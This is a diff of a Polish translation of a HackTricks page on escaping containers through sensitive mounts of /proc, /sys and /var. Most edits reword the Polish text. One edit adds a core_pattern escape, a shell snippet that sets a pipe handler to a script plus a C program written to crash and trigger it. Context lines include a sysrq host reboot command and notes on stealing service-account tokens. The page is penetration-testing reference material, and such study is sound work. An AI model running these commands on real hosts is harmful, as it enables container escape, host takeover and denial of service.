@@ -2,29 +2,41 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-Ekspozycja `/proc`, `/sys` i `/var` bez odpowiedniej izolacji przestrzeni nazw wprowadza znaczące ryzyko bezpieczeństwa, w tym powiększenie powierzchni ataku i ujawnienie informacji. Te katalogi zawierają wrażliwe pliki, które, jeśli są źle skonfigurowane lub dostępne dla nieautoryzowanego użytkownika, mogą prowadzić do ucieczki z kontenera, modyfikacji hosta lub dostarczenia informacji wspierających dalsze ataki. Na przykład, niewłaściwe zamontowanie `-v /proc:/host/proc` może obejść ochronę AppArmor z powodu swojej opartej na ścieżkach natury, pozostawiając `/host/proc` bez ochrony.
+Ekspozycja `/proc`, `/sys` i `/var` bez odpowiedniej izolacji przestrzeni nazw wprowadza znaczące ryzyko bezpieczeństwa, w tym powiększenie powierzchni ataku i ujawnienie informacji. Te katalogi zawierają wrażliwe pliki, które, jeśli są źle skonfigurowane lub dostępne dla nieautoryzowanego użytkownika, mogą prowadzić do ucieczki z kontenera, modyfikacji hosta lub dostarczyć informacji wspomagających dalsze ataki. Na przykład, niewłaściwe zamontowanie `-v /proc:/host/proc` może obejść ochronę AppArmor z powodu swojej opartej na ścieżce natury, pozostawiając `/host/proc` bez ochrony.
 
-**Szczegółowe informacje o każdej potencjalnej luce można znaleźć w** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
+**Możesz znaleźć dalsze szczegóły dotyczące każdej potencjalnej luki w** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
 
 ## procfs Vulnerabilities
 
 ### `/proc/sys`
 
-Ten katalog pozwala na modyfikację zmiennych jądra, zazwyczaj za pomocą `sysctl(2)`, i zawiera kilka subkatalogów budzących niepokój:
+Ten katalog pozwala na dostęp do modyfikacji zmiennych jądra, zazwyczaj za pomocą `sysctl(2)`, i zawiera kilka subkatalogów budzących niepokój:
 
 #### **`/proc/sys/kernel/core_pattern`**
 
 - Opisany w [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-- Umożliwia zdefiniowanie programu do wykonania przy generowaniu pliku core z pierwszymi 128 bajtami jako argumentami. Może to prowadzić do wykonania kodu, jeśli plik zaczyna się od rury `|`.
+- Jeśli możesz pisać w tym pliku, możliwe jest zapisanie potoku `|` po którym następuje ścieżka do programu lub skryptu, który zostanie wykonany po wystąpieniu awarii.
+- Atakujący może znaleźć ścieżkę wewnątrz hosta do swojego kontenera, wykonując `mount` i zapisać ścieżkę do binarnego pliku wewnątrz systemu plików swojego kontenera. Następnie, spowodować awarię programu, aby zmusić jądro do wykonania binarnego pliku poza kontenerem.
+
 - **Przykład testowania i eksploatacji**:
-
 ```bash
-[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test dostępu do zapisu
+[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
 cd /proc/sys/kernel
-echo "|$overlay/shell.sh" > core_pattern # Ustaw niestandardowy handler
-sleep 5 && ./crash & # Wywołaj handler
+echo "|$overlay/shell.sh" > core_pattern # Set custom handler
+sleep 5 && ./crash & # Trigger handler
 ```
+Sprawdź [ten post](https://pwning.systems/posts/escaping-containers-for-fun/) po więcej informacji.
 
+Przykładowy program, który się zawiesza:
+```c
+int main(void) {
+char buf[1];
+for (int i = 0; i < 100; i++) {
+buf[i] = 1;
+}
+return 0;
+}
+```
 #### **`/proc/sys/kernel/modprobe`**
 
 - Szczegóły w [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
@@ -38,12 +50,12 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Sprawdź dostęp do modprobe
 #### **`/proc/sys/vm/panic_on_oom`**
 
 - Odniesienie w [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-- Globalny flag, który kontroluje, czy jądro panikuje, czy wywołuje OOM killera, gdy występuje warunek OOM.
+- Globalny flag, który kontroluje, czy jądro panikuje lub wywołuje OOM killera, gdy wystąpi warunek OOM.
 
 #### **`/proc/sys/fs`**
 
 - Zgodnie z [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), zawiera opcje i informacje o systemie plików.
-- Dostęp do zapisu może umożliwić różne ataki typu denial-of-service przeciwko hostowi.
+- Dostęp do zapisu może umożliwić różne ataki typu denial-of-service na hosta.
 
 #### **`/proc/sys/fs/binfmt_misc`**
 
@@ -51,7 +63,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Sprawdź dostęp do modprobe
 - Może prowadzić do eskalacji uprawnień lub dostępu do powłoki root, jeśli `/proc/sys/fs/binfmt_misc/register` jest zapisywalny.
 - Istotny exploit i wyjaśnienie:
 - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
-- Szczegółowy tutorial: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
+- Szczegółowy samouczek: [Link do wideo](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
 ### Inne w `/proc`
 
@@ -102,7 +114,7 @@ echo b > /proc/sysrq-trigger # Ponownie uruchamia hosta
 #### **`/proc/mem`**
 
 - Alternatywny interfejs dla `/dev/mem`, reprezentujący pamięć fizyczną.
-- Umożliwia odczyt i zapis, modyfikacja całej pamięci wymaga rozwiązania adresów wirtualnych na fizyczne.
+- Umożliwia odczyt i zapis, modyfikacja całej pamięci wymaga przekształcenia adresów wirtualnych na fizyczne.
 
 #### **`/proc/sched_debug`**
 
@@ -114,13 +126,13 @@ echo b > /proc/sysrq-trigger # Ponownie uruchamia hosta
 - Dostarcza informacje o punktach montowania w przestrzeni nazw montowania procesu.
 - Ujawnia lokalizację `rootfs` kontenera lub obrazu.
 
-### `/sys` Vulnerabilities
+### Luki w `/sys`
 
 #### **`/sys/kernel/uevent_helper`**
 
 - Używane do obsługi `uevent` urządzeń jądra.
-- Zapis do `/sys/kernel/uevent_helper` może wykonać dowolne skrypty po wyzwoleniu `uevent`.
-- **Przykład eksploatacji**: %%%bash
+- Zapis do `/sys/kernel/uevent_helper` może wykonywać dowolne skrypty po wyzwoleniu `uevent`.
+- **Przykład wykorzystania**: %%%bash
 
 #### Tworzy ładunek
 
@@ -144,11 +156,11 @@ cat /output %%%
 
 #### **`/sys/class/thermal`**
 
-- Kontroluje ustawienia temperatury, potencjalnie powodując ataki DoS lub fizyczne uszkodzenia.
+- Kontroluje ustawienia temperatury, co może prowadzić do ataków DoS lub uszkodzenia fizycznego.
 
 #### **`/sys/kernel/vmcoreinfo`**
 
-- Ujawnia adresy jądra, potencjalnie kompromitując KASLR.
+- Ujawnia adresy jądra, co może kompromitować KASLR.
 
 #### **`/sys/kernel/security`**
 
@@ -158,16 +170,18 @@ cat /output %%%
 #### **`/sys/firmware/efi/vars` i `/sys/firmware/efi/efivars`**
 
 - Ujawnia interfejsy do interakcji z zmiennymi EFI w NVRAM.
-- Błędna konfiguracja lub eksploatacja może prowadzić do zablokowanych laptopów lub nieuruchamialnych maszyn hosta.
+- Błędna konfiguracja lub wykorzystanie może prowadzić do zablokowanych laptopów lub maszyn hosta, które nie mogą się uruchomić.
 
 #### **`/sys/kernel/debug`**
 
 - `debugfs` oferuje interfejs debugowania "bez zasad" do jądra.
-- Historia problemów z bezpieczeństwem z powodu swojej nieograniczonej natury.
+- Historia problemów z bezpieczeństwem z powodu jego nieograniczonej natury.
 
-### `/var` Vulnerabilities
+### Luki w `/var`
 
-Folder **/var** hosta zawiera gniazda czasu wykonywania kontenerów i systemy plików kontenerów. Jeśli ten folder jest zamontowany wewnątrz kontenera, ten kontener uzyska dostęp do odczytu i zapisu do systemów plików innych kontenerów z uprawnieniami root. Może to być wykorzystywane do przełączania się między kontenerami, powodowania odmowy usługi lub wprowadzania tylnego wejścia do innych kontenerów i aplikacji, które w nich działają.
+Folder **/var** hosta zawiera gniazda czasu wykonywania kontenerów oraz systemy plików kontenerów. 
+Jeśli ten folder jest zamontowany wewnątrz kontenera, ten kontener uzyska dostęp do odczytu i zapisu do systemów plików innych kontenerów z uprawnieniami root. 
+Może to być nadużywane do przełączania się między kontenerami, powodowania odmowy usługi lub wprowadzania tylnego wejścia do innych kontenerów i aplikacji, które w nich działają.
 
 #### Kubernetes
 
@@ -235,7 +249,7 @@ Kontener może odczytywać tokeny K8s serviceaccount lub tokeny AWS webidentity,
 ```
 #### Docker
 
-Eksploatacja w Dockerze (lub w wdrożeniach Docker Compose) jest dokładnie taka sama, z tym że zazwyczaj systemy plików innych kontenerów są dostępne pod inną podstawową ścieżką:
+Eksploatacja w Dockerze (lub w wdrożeniach Docker Compose) jest dokładnie taka sama, z tą różnicą, że zazwyczaj systemy plików innych kontenerów są dostępne pod inną ścieżką bazową:
 ```bash
 $ docker info | grep -i 'docker root\|storage driver'
 Storage Driver: overlay2
